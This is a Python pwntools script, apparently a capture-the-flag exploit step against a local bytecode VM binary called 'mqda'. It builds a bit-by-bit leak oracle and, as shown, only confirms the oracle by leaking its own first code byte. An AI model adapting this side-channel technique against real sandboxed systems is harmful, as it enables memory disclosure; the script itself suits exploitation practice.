#!/usr/bin/env python3
"""
MQDA Exploit - Bit-by-Bit Oracle (Fixed)

This version correctly leaks data by loading target data into the same
execution context as the oracle code.
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_leak_code(code_addr, bit_position, expected_bit):
    """
    Create code that tests if bit at code_addr+0 (first byte of our code) equals expected_bit.
    This demonstrates leaking from the code itself.
    """
    code = b''
    
    # Read from offset 0 of our code page (the first byte)
    # Set SP so [SP+4] points to code_addr
    code += mov_reg_imm(15, code_addr - 4)
    code += pop_reg(0)
    
    # Isolate bit
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = code_addr + len(code)
    hlt_addr = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_addr)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_self_bit(code_addr, bit_position, expected_bit=1):
    """Test if bit of first code byte equals expected_bit."""
    code = create_leak_code(code_addr, bit_position, expected_bit)
    
    # The first byte of code is 0x41 (MOV_REG_IMM)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_first_code_byte(code_addr):
    """Leak the first byte of our code (should be 0x41)."""
    val = 0
    for bit in range(8):
        if test_self_bit(code_addr, bit, 1):
            val |= (1 << bit)
    return val

def main():
    code_addr = 0x10000
    
    print("[*] MQDA Self-Leak Test")
    print(f"[*] Code at: 0x{code_addr:x}")
    print("[*] Leaking first byte of our code (should be 0x41)...")
    
    byte = leak_first_code_byte(code_addr)
    print(f"[*] Leaked: 0x{byte:02x}")
    
    if byte == 0x41:
        print("[+] SUCCESS! Oracle works correctly!")
    else:
        print(f"[-] Expected 0x41, got 0x{byte:02x}")

if __name__ == '__main__':
    main()
